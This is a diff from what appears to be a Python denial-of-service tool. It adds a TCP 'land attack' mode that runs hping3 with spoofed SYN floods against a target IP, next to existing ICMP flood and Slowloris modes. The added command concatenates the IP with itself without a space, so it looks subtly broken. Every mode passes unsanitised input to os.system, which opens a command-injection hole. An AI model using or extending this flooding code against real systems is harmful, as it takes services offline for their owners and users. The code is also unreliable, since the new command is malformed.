@@ -111,6 +111,9 @@ if __name__ == "__main__":
 	# hping3 for ICMP DDoS
 	if args.ddos == 'icmp':
 		os.system('hping3 -V -1 -d 1400 --faster ' + args.ip)
+	# hping3 for TCP Land Attack
+	if args.ddos == 'land':
+		os.system('hping3 -c 10000 -d 120 -S -w 64 -p 80 --faster -a ' + args.ip + args.ip)
     #Slowloris
 	if args.ddos == 'slowloris':
 		slowloris()
